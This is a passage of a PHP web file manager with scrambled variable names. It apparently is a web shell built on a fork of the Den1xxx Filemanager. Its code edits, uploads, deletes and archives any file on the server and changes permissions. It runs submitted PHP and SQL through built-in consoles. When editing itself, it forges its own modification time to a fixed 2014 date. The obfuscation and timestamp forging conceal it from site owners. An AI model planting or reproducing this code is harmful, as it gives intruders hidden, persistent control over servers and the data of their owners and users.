}
@media screen and (max-width:720px){
  table{display:block;}
    #fm_table td{display:inline;float:left;}
    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}
    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}
    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}
	#header_table table td {display:inline;float:left;}
}
</style>
</head>
<body>
<?php
$url_inc = '?fm=true';
if (isset($_POST['sqlrun'])&&!empty($qdsbknxmygjctfzpravewh['enable_sql_console'])){
	$res = empty($_POST['sql']) ? '' : $_POST['sql'];
	$res_lng = 'sql';
} elseif (isset($_POST['phprun'])&&!empty($qdsbknxmygjctfzpravewh['enable_php_console'])){
	$res = empty($_POST['php']) ? '' : $_POST['php'];
	$res_lng = 'php';
} 
if (isset($_GET['fm_settings'])) {
	echo ' 
<table class="whole">
<form method="post" action="">
<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
'.(empty($qwgdrjtkzvafsecpunxbhy)?'':'<tr><td class="row2" colspan="2">'.$qwgdrjtkzvafsecpunxbhy.'</td></tr>').'
'.fm_config_checkbox_row(__('Show size of the folder'),'show_dir_size').'
'.fm_config_checkbox_row(__('Show').' '.__('pictures'),'show_img').'
'.fm_config_checkbox_row(__('Show').' '.__('Make directory'),'make_directory').'
'.fm_config_checkbox_row(__('Show').' '.__('New file'),'new_file').'
'.fm_config_checkbox_row(__('Show').' '.__('Upload'),'upload_file').'
'.fm_config_checkbox_row(__('Show').' PHP version','show_php_ver').'
'.fm_config_checkbox_row(__('Show').' PHP ini','show_php_ini').'
'.fm_config_checkbox_row(__('Show').' '.__('Generation time'),'show_gt').'
'.fm_config_checkbox_row(__('Show').' xls','show_xls').'
'.fm_config_checkbox_row(__('Show').' PHP '.__('Console'),'enable_php_console').'
'.fm_config_checkbox_row(__('Show').' SQL '.__('Console'),'enable_sql_console').'
<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$qdsbknxmygjctfzpravewh['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$qdsbknxmygjctfzpravewh['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>
<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$qdsbknxmygjctfzpravewh['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$qdsbknxmygjctfzpravewh['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>
'.fm_config_checkbox_row(__('Show').' Proxy','enable_proxy').'
'.fm_config_checkbox_row(__('Show').' phpinfo()','show_phpinfo').'
'.fm_config_checkbox_row(__('Show').' '.__('Settings'),'fm_settings').'
'.fm_config_checkbox_row(__('Restore file time after editing'),'restore_time').'
'.fm_config_checkbox_row(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'
<tr><td class="row3"><a href="'.fm_url().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>
</form>
</table>
<table>
<form method="post" action="">
<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($dbevfpwzjxrqtymuhgscan['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
<tr><td class="row1"><input name="fm_login[login]" value="'.$dbevfpwzjxrqtymuhgscan['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>
<tr><td class="row1"><input name="fm_login[password]" value="'.$dbevfpwzjxrqtymuhgscan['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>
<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$dbevfpwzjxrqtymuhgscan['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$dbevfpwzjxrqtymuhgscan['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$dbevfpwzjxrqtymuhgscan['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
</form>
</table>';
echo fm_tpl_form('php'),fm_tpl_form('sql');
} elseif (isset($proxy_form)) {
	die($proxy_form);
} elseif (isset($res_lng)) {	
?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$rgvxhjbkznwpescmudqfyt?></th>
</tr>
<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($res_lng)?> <?=__('Console')?><?php
	if($res_lng=='sql') echo ' - Database: '.$qdsbknxmygjctfzpravewh['sql_db'].'</h2></td><td>'.fm_run_input('php');
	else echo '</h2></td><td>'.fm_run_input('sql');
	?></td></tr></table></td>
</tr>
<tr>
    <td class="row1">
		<a href="<?=$url_inc.'&path=' . $rgvxhjbkznwpescmudqfyt;?>"><?=__('Back')?></a>
		<form action="" method="POST" name="console">
		<textarea name="<?=$res_lng?>" cols="80" rows="10" style="width: 90%"><?=$res?></textarea><br/>
		<input type="reset" value="<?=__('Reset')?>">
		<input type="submit" value="<?=__('Submit')?>" name="<?=$res_lng?>run">
<?php
$str_tmpl = $res_lng.'_templates';
$tmpl = !empty($$str_tmpl) ? json_decode($$str_tmpl,true) : '';
if (!empty($tmpl)){
	$active = isset($_POST[$res_lng.'_tpl']) ? $_POST[$res_lng.'_tpl'] : '';
	$select = '<select name="'.$res_lng.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$res_lng.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$res_lng.'\'].value =\'\';" >'."\n";
	$select .= '<option value="-1">' . __('Select') . "</option>\n";
	foreach ($tmpl as $key=>$value){
		$select.='<option value="'.$value.'" '.((!empty($value)&&($value==$active))?'selected':'').' >'.__($key)."</option>\n";
	}
	$select .= "</select>\n";
	echo $select;
}
?>
		</form>
	</td>
</tr>
</table>
<?php
	if (!empty($res)) {
		$fun='fm_'.$res_lng;
		echo '<h3>'.strtoupper($res_lng).' '.__('Result').'</h3><pre>'.$fun($res).'</pre>';
	}
} elseif (!empty($_REQUEST['edit'])){
	if(!empty($_REQUEST['save'])) {
		$fn = $rgvxhjbkznwpescmudqfyt . $_REQUEST['edit'];
		$pbzwqxnsguyvdrmhtkcfae = filemtime($fn);
	    if (file_put_contents($fn, $_REQUEST['newcontent'])) $qwgdrjtkzvafsecpunxbhy .= __('File updated');
		else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
		if ($_GET['edit']==basename(__FILE__)) {
			touch(__FILE__,1415116371);
		} else {
			if (!empty($qdsbknxmygjctfzpravewh['restore_time'])) touch($fn,$pbzwqxnsguyvdrmhtkcfae);
		}
	}
    $oldcontent = @file_get_contents($rgvxhjbkznwpescmudqfyt . $_REQUEST['edit']);
    $editlink = $url_inc . '&edit=' . $_REQUEST['edit'] . '&path=' . $rgvxhjbkznwpescmudqfyt;
    $backlink = $url_inc . '&path=' . $rgvxhjbkznwpescmudqfyt;
?>
<table border='0' cellspacing='0' cellpadding='1' width="100%">
<tr>
    <th><?=__('File manager').' - '.__('Edit').' - '.$rgvxhjbkznwpescmudqfyt.$_REQUEST['edit']?></th>
</tr>
<tr>
    <td class="row1">
        <?=$qwgdrjtkzvafsecpunxbhy?>
	</td>
</tr>
<tr>
    <td class="row1">
        <?=fm_home()?> <a href="<?=$backlink?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$editlink?>">
            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldcontent)?></textarea>
            <input type="submit" name="save" value="<?=__('Submit')?>">
            <input type="submit" name="cancel" value="<?=__('Cancel')?>">
        </form>
    </td>
</tr>
</table>
<?php
echo $dbevfpwzjxrqtymuhgscan['script'];
} elseif(!empty($_REQUEST['rights'])){
	if(!empty($_REQUEST['save'])) {
	    if(fm_chmod($rgvxhjbkznwpescmudqfyt . $_REQUEST['rights'], fm_convert_rights($_REQUEST['rights_val']), @$_REQUEST['recursively']))
		$qwgdrjtkzvafsecpunxbhy .= (__('File updated')); 
		else $qwgdrjtkzvafsecpunxbhy .= (__('Error occurred'));
	}
	clearstatcache();
    $oldrights = fm_rights_string($rgvxhjbkznwpescmudqfyt . $_REQUEST['rights'], true);
    $link = $url_inc . '&rights=' . $_REQUEST['rights'] . '&path=' . $rgvxhjbkznwpescmudqfyt;
    $backlink = $url_inc . '&path=' . $rgvxhjbkznwpescmudqfyt;
?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$rgvxhjbkznwpescmudqfyt?></th>
</tr>
<tr>
    <td class="row1">
        <?=$qwgdrjtkzvafsecpunxbhy?>
	</td>
</tr>
<tr>
    <td class="row1">
        <a href="<?=$backlink?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$link?>">
           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldrights?>">
        <?php if (is_dir($rgvxhjbkznwpescmudqfyt.$_REQUEST['rights'])) { ?>
            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>
        <?php } ?>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>
</table>
<?php
} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
	if(!empty($_REQUEST['save'])) {
	    rename($rgvxhjbkznwpescmudqfyt . $_REQUEST['rename'], $rgvxhjbkznwpescmudqfyt . $_REQUEST['newname']);
		$qwgdrjtkzvafsecpunxbhy .= (__('File updated'));
		$_REQUEST['rename'] = $_REQUEST['newname'];
	}
	clearstatcache();
    $link = $url_inc . '&rename=' . $_REQUEST['rename'] . '&path=' . $rgvxhjbkznwpescmudqfyt;
    $backlink = $url_inc . '&path=' . $rgvxhjbkznwpescmudqfyt;

?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$rgvxhjbkznwpescmudqfyt?></th>
</tr>
<tr>
    <td class="row1">
        <?=$qwgdrjtkzvafsecpunxbhy?>
	</td>
</tr>
<tr>
    <td class="row1">
        <a href="<?=$backlink?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$link?>">
            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>
</table>
<?php
} else {
//Let's rock!
    $qwgdrjtkzvafsecpunxbhy = '';
    if(!empty($_FILES['upload'])&&!empty($qdsbknxmygjctfzpravewh['upload_file'])) {
        if(!empty($_FILES['upload']['name'])){
            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);
            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $rgvxhjbkznwpescmudqfyt . $_FILES['upload']['name'])){
                $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
            } else {
				$qwgdrjtkzvafsecpunxbhy .= __('Files uploaded').': '.$_FILES['upload']['name'];
			}
        }
    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {
        if(!fm_del_files(($rgvxhjbkznwpescmudqfyt . $_REQUEST['delete']), true)) {
            $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
        } else {
			$qwgdrjtkzvafsecpunxbhy .= __('Deleted').' '.$_REQUEST['delete'];
		}
	} elseif(!empty($_REQUEST['mkdir'])&&!empty($qdsbknxmygjctfzpravewh['make_directory'])) {
        if(!@mkdir($rgvxhjbkznwpescmudqfyt . $_REQUEST['dirname'],0777)) {
            $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
        } else {
			$qwgdrjtkzvafsecpunxbhy .= __('Created').' '.$_REQUEST['dirname'];
		}
    } elseif(!empty($_POST['search_recursive'])) {
		ini_set('max_execution_time', '0');
		$search_data =  find_text_in_files($_POST['path'], $_POST['mask'], $_POST['search_recursive']);
		if(!empty($search_data)) {
			$qwgdrjtkzvafsecpunxbhy .= __('Found in files').' ('.count($search_data).'):<br>';
			foreach ($search_data as $filename) {
				$qwgdrjtkzvafsecpunxbhy .= '<a href="'.fm_url(true).'?fm=true&edit='.basename($filename).'&path='.str_replace('/'.basename($filename),'/',$filename).'" title="' . __('Edit') . '">'.basename($filename).'</a>&nbsp; &nbsp;';
			}
		} else {
			$qwgdrjtkzvafsecpunxbhy .= __('Nothing founded');
		}	
	} elseif(!empty($_REQUEST['mkfile'])&&!empty($qdsbknxmygjctfzpravewh['new_file'])) {
        if(!$asyqwgrmchekdubtvpzjfn=@fopen($rgvxhjbkznwpescmudqfyt . $_REQUEST['filename'],"w")) {
            $qwgdrjtkzvafsecpunxbhy .= __('Error occurred');
        } else {
			fclose($asyqwgrmchekdubtvpzjfn);
			$qwgdrjtkzvafsecpunxbhy .= __('Created').' '.$_REQUEST['filename'];
		}
    } elseif (isset($_GET['zip'])) {
		$source = base64_decode($_GET['zip']);
		$destination = basename($source).'.zip';
		set_time_limit(0);
		$phar = new PharData($destination);
		$phar->buildFromDirectory($source);
		if (is_file($destination))
		$qwgdrjtkzvafsecpunxbhy .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
		'.&nbsp;'.fm_link('download',$rgvxhjbkznwpescmudqfyt.$destination,__('Download'),__('Download').' '. $destination)
		.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $rgvxhjbkznwpescmudqfyt.'" title="'.__('Delete').' '. $destination.'" >'.__('Delete') . '</a>';
		else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred').': '.__('no files');
	} elseif (isset($_GET['gz'])) {
		$source = base64_decode($_GET['gz']);
		$archive = $source.'.tar';
		$destination = basename($source).'.tar';
		if (is_file($archive)) unlink($archive);
		if (is_file($archive.'.gz')) unlink($archive.'.gz');
		clearstatcache();
		set_time_limit(0);
		//die();
		$phar = new PharData($destination);
		$phar->buildFromDirectory($source);
		$phar->compress(Phar::GZ,'.tar.gz');
		unset($phar);
		if (is_file($archive)) {
			if (is_file($archive.'.gz')) {
				unlink($archive); 
				$destination .= '.gz';
			}

			$qwgdrjtkzvafsecpunxbhy .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
			'.&nbsp;'.fm_link('download',$rgvxhjbkznwpescmudqfyt.$destination,__('Download'),__('Download').' '. $destination)
			.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $rgvxhjbkznwpescmudqfyt.'" title="'.__('Delete').' '.$destination.'" >'.__('Delete').'</a>';
		} else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred').': '.__('no files');
	} elseif (isset($_GET['decompress'])) {
		// $source = base64_decode($_GET['decompress']);
		// $destination = basename($source);
		// $ext = end(explode(".", $destination));
		// if ($ext=='zip' OR $ext=='gz') {
			// $phar = new PharData($source);
			// $phar->decompress();
			// $base_file = str_replace('.'.$ext,'',$destination);
			// $ext = end(explode(".", $base_file));
			// if ($ext=='tar'){
				// $phar = new PharData($base_file);
				// $phar->extractTo(dir($source));
			// }
		// } 
		// $qwgdrjtkzvafsecpunxbhy .= __('Task').' "'.__('Decompress').' '.$source.'" '.__('done');
	} elseif (isset($_GET['gzfile'])) {
		$source = base64_decode($_GET['gzfile']);
		$archive = $source.'.tar';
		$destination = basename($source).'.tar';
		if (is_file($archive)) unlink($archive);
		if (is_file($archive.'.gz')) unlink($archive.'.gz');
		set_time_limit(0);
		//echo $destination;
		$ext_arr = explode('.',basename($source));
		if (isset($ext_arr[1])) {
			unset($ext_arr[0]);
			$ext=implode('.',$ext_arr);
		} 
		$phar = new PharData($destination);
		$phar->addFile($source);
		$phar->compress(Phar::GZ,$ext.'.tar.gz');
		unset($phar);
		if (is_file($archive)) {
			if (is_file($archive.'.gz')) {
				unlink($archive); 
				$destination .= '.gz';
			}
			$qwgdrjtkzvafsecpunxbhy .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
			'.&nbsp;'.fm_link('download',$rgvxhjbkznwpescmudqfyt.$destination,__('Download'),__('Download').' '. $destination)
			.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $rgvxhjbkznwpescmudqfyt.'" title="'.__('Delete').' '.$destination.'" >'.__('Delete').'</a>';
		} else $qwgdrjtkzvafsecpunxbhy .= __('Error occurred').': '.__('no files');
	}
?>
<table class="whole" id="header_table" >
<tr>
    <th colspan="2"><?=__('File manager')?><?=(!empty($rgvxhjbkznwpescmudqfyt)?' - '.$rgvxhjbkznwpescmudqfyt:'')?></th>
</tr>
<?php if(!empty($qwgdrjtkzvafsecpunxbhy)){ ?>
<tr>
	<td colspan="2" class="row2"><?=$qwgdrjtkzvafsecpunxbhy?></td>
</tr>
<?php } ?>
<tr>
    <td class="row2">
		<table>
			<tr>
			<td>
				<?=fm_home()?>
			</td>
			<td>
			<?php if(!empty($qdsbknxmygjctfzpravewh['make_directory'])) { ?>
				<form method="post" action="<?=$url_inc?>">
				<input type="hidden" name="path" value="<?=$rgvxhjbkznwpescmudqfyt?>" />
				<input type="text" name="dirname" size="15">
				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
				</form>
			<?php } ?>
			</td>
			<td>
			<?php if(!empty($qdsbknxmygjctfzpravewh['new_file'])) { ?>
				<form method="post" action="<?=$url_inc?>">
				<input type="hidden" name="path"     value="<?=$rgvxhjbkznwpescmudqfyt?>" />
				<input type="text"   name="filename" size="15">
				<input type="submit" name="mkfile"   value="<?=__('New file')?>">
				</form>
			<?php } ?>
			</td>
			<td>
				<form  method="post" action="<?=$url_inc?>" style="display:inline">
				<input type="hidden" name="path" value="<?=$rgvxhjbkznwpescmudqfyt?>" />
				<input type="text" placeholder="<?=__('Recursive search')?>" name="search_recursive" value="<?=!empty($_POST['search_recursive'])?$_POST['search_recursive']:''?>" size="15">
				<input type="text" name="mask" placeholder="<?=__('Mask')?>" value="<?=!empty($_POST['mask'])?$_POST['mask']:'*.*'?>" size="5">
				<input type="submit" name="search" value="<?=__('Search')?>">
				</form>
			</td>
			<td>
			<?=fm_run_input('php')?>
			</td>
			<td>
			<?=fm_run_input('sql')?>
			</td>
			</tr>
		</table>
    </td>
    <td class="row3">
		<table>
		<tr>
		<td>
		<?php if (!empty($qdsbknxmygjctfzpravewh['upload_file'])) { ?>
			<form name="form1" method="post" action="<?=$url_inc?>" enctype="multipart/form-data">
			<input type="hidden" name="path" value="<?=$rgvxhjbkznwpescmudqfyt?>" />
			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />
			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />
			<input type="submit" name="test" value="<?=__('Upload')?>" />
			</form>
		<?php } ?>
		</td>
		<td>
		<?php if ($dbevfpwzjxrqtymuhgscan['authorize']) { ?>
			<form action="" method="post">&nbsp;&nbsp;&nbsp;
			<input name="quit" type="hidden" value="1">
			<?=__('Hello')?>, <?=$dbevfpwzjxrqtymuhgscan['login']?>
			<input type="submit" value="<?=__('Quit')?>">
			</form>
		<?php } ?>
		</td>
		<td>
		<?=fm_lang_form($fvyhagtnscbjqmrzkwpuxe)?>
		</td>
		<tr>
		</table>
    </td>
</tr>
</table>
<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">
<thead>
<tr> 
    <th style="white-space:nowrap"> <?=__('Filename')?> </th>
    <th style="white-space:nowrap"> <?=__('Size')?> </th>
    <th style="white-space:nowrap"> <?=__('Date')?> </th>
    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
</tr>
</thead>
<tbody>
<?php
$elements = fm_scan_dir($rgvxhjbkznwpescmudqfyt, '', 'all', true);
$dirs = array();
$files = array();
foreach ($elements as $wjvdmrgebyxuqaknzshpct){
    if(@is_dir($rgvxhjbkznwpescmudqfyt . $wjvdmrgebyxuqaknzshpct)){
        $dirs[] = $wjvdmrgebyxuqaknzshpct;
    } else {
        $files[] = $wjvdmrgebyxuqaknzshpct;
    }
}
natsort($dirs); natsort($files);
$elements = array_merge($dirs, $files);

foreach ($elements as $wjvdmrgebyxuqaknzshpct){
    $filename = $rgvxhjbkznwpescmudqfyt . $wjvdmrgebyxuqaknzshpct;
    $filedata = @stat($filename);
    if(@is_dir($filename)){
		$filedata[7] = '';
		if (!empty($qdsbknxmygjctfzpravewh['show_dir_size'])&&!fm_root($wjvdmrgebyxuqaknzshpct)) $filedata[7] = fm_dir_size($filename);
        $link = '<a href="'.$url_inc.'&path='.$rgvxhjbkznwpescmudqfyt.$wjvdmrgebyxuqaknzshpct.'" title="'.__('Show').' '.$wjvdmrgebyxuqaknzshpct.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$wjvdmrgebyxuqaknzshpct.'</a>';
        $loadlink= (fm_root($wjvdmrgebyxuqaknzshpct)||$tnurbgeckspvzfwmjaxqdh) ? '' : fm_link('zip',$filename,__('Compress').'&nbsp;zip',__('Archiving').' '. $wjvdmrgebyxuqaknzshpct);
		$arlink  = (fm_root($wjvdmrgebyxuqaknzshpct)||$tnurbgeckspvzfwmjaxqdh) ? '' : fm_link('gz',$filename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$wjvdmrgebyxuqaknzshpct);
        $style = 'row2';
		 if (!fm_root($wjvdmrgebyxuqaknzshpct)) $alert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $wjvdmrgebyxuqaknzshpct. '\')) document.location.href = \'' . $url_inc . '&delete=' . $wjvdmrgebyxuqaknzshpct . '&path=' . $rgvxhjbkznwpescmudqfyt  . '\'"'; else $alert = '';
    } else {
		$link = 
			$qdsbknxmygjctfzpravewh['show_img']&&@getimagesize($filename) 
			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''
			. fm_img_link($filename)
			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.fm_img_link($filename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$wjvdmrgebyxuqaknzshpct.'</a>'
			: '<a href="' . $url_inc . '&edit=' . $wjvdmrgebyxuqaknzshpct . '&path=' . $rgvxhjbkznwpescmudqfyt. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$wjvdmrgebyxuqaknzshpct.'</a>';
		$e_arr = explode(".", $wjvdmrgebyxuqaknzshpct);
		$ext = end($e_arr);
        $loadlink =  fm_link('download',$filename,__('Download'),__('Download').' '. $wjvdmrgebyxuqaknzshpct);
		$arlink = in_array($ext,array('zip','gz','tar')) 
		? ''
		: ((fm_root($wjvdmrgebyxuqaknzshpct)||$tnurbgeckspvzfwmjaxqdh) ? '' : fm_link('gzfile',$filename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $wjvdmrgebyxuqaknzshpct));
        $style = 'row1';
		$alert = 'onClick="if(confirm(\''. __('File selected').': \n'. $wjvdmrgebyxuqaknzshpct. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $url_inc . '&delete=' . $wjvdmrgebyxuqaknzshpct . '&path=' . $rgvxhjbkznwpescmudqfyt  . '\'"';
    }
    $deletelink = fm_root($wjvdmrgebyxuqaknzshpct) ? '' : '<a href="#" title="' . __('Delete') . ' '. $wjvdmrgebyxuqaknzshpct . '" ' . $alert . '>' . __('Delete') . '</a>';
    $renamelink = fm_root($wjvdmrgebyxuqaknzshpct) ? '' : '<a href="' . $url_inc . '&rename=' . $wjvdmrgebyxuqaknzshpct . '&path=' . $rgvxhjbkznwpescmudqfyt . '" title="' . __('Rename') .' '. $wjvdmrgebyxuqaknzshpct . '">' . __('Rename') . '</a>';
    $rightstext = ($wjvdmrgebyxuqaknzshpct=='.' || $wjvdmrgebyxuqaknzshpct=='..') ? '' : '<a href="' . $url_inc . '&rights=' . $wjvdmrgebyxuqaknzshpct . '&path=' . $rgvxhjbkznwpescmudqfyt . '" title="' . __('Rights') .' '. $wjvdmrgebyxuqaknzshpct . '">' . @fm_rights_string($filename) . '</a>';
?>
<tr class="<?=$style?>"> 
    <td><?=$link?></td>
    <td><?=$filedata[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$filedata[9])?></td>
    <td><?=$rightstext?></td>
    <td><?=$deletelink?></td>
    <td><?=$renamelink?></td>
    <td><?=$loadlink?></td>
    <td><?=$arlink?></td>
</tr>
<?php
    }
}
?>
</tbody>
</table>
<div class="row3"><?php
	$mtime = explode(' ', microtime()); 
	$totaltime = $mtime[0] + $mtime[1] - $tnymjdkwhbaqevrgpfucsx; 
	echo fm_home().' | ver. '.$xzausvmyqwegcbdptrnhjf.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.fm_site_url().'">.</a>';
	if (!empty($qdsbknxmygjctfzpravewh['show_php_ver'])) echo ' | PHP '.phpversion();
	if (!empty($qdsbknxmygjctfzpravewh['show_php_ini'])) echo ' | '.php_ini_loaded_file();
	if (!empty($qdsbknxmygjctfzpravewh['show_gt'])) echo ' | '.__('Generation time').': '.round($totaltime,2);
	if (!empty($qdsbknxmygjctfzpravewh['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';
	if (!empty($qdsbknxmygjctfzpravewh['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';
	if (!empty($qdsbknxmygjctfzpravewh['show_xls'])&&!empty($link)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';
	if (!empty($qdsbknxmygjctfzpravewh['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';
	?>
</div>
<script type="text/javascript">
function download_xls(filename, text) {
	var element = document.createElement('a');
	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);
	element.setAttribute('download', filename);
	element.style.display = 'none';
	document.body.appendChild(element);
	element.click();
	document.body.removeChild(element);
}

function base64_encode(m) {
	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {
		c = m.charCodeAt(l);
		if (128 > c) d = 1;
		else
			for (d = 2; c >= 2 << 5 * d;) ++d;
		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
	}
	b && (g += k[f << 6 - b]);
	return g
}


var tableToExcelData = (function() {
    var uri = 'data:application/vnd.ms-excel;base64,',
    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',
    format = function(s, c) {
            return s.replace(/{(\w+)}/g, function(m, p) {
                return c[p];
            })
        }
    return function(table, name) {
        if (!table.nodeType) table = document.getElementById(table)
        var ctx = {
            worksheet: name || 'Worksheet',
            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")
        }
		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'
		download_xls(filename, base64_encode(format(template, ctx)))
    }
})();

var table2Excel = function () {

    var ua = window.navigator.userAgent;
    var msie = ua.indexOf("MSIE ");

	this.CreateExcelSheet = 
		function(el, name){
			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer

				var x = document.getElementById(el).rows;

				var xls = new ActiveXObject("Excel.Application");

				xls.visible = true;
				xls.Workbooks.Add
				for (i = 0; i < x.length; i++) {
					var y = x[i].cells;

					for (j = 0; j < y.length; j++) {
						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}
				}
				xls.Visible = true;
				xls.UserControl = true;
				return xls;
			} else {
				tableToExcelData(el, name);
			}
		}
}
</script>
</body>
</html>

<?php
//Ported from ReloadCMS project http://reloadcms.com
class archiveTar {
	var $archive_name = '';
	var $tmp_file = 0;
	var $file_pos = 0;
	var $isGzipped = true;
	var $errors = array();
	var $files = array();
	
	function __construct(){
		if (!isset($this->errors)) $this->errors = array();
	}
	
	function createArchive($file_list){
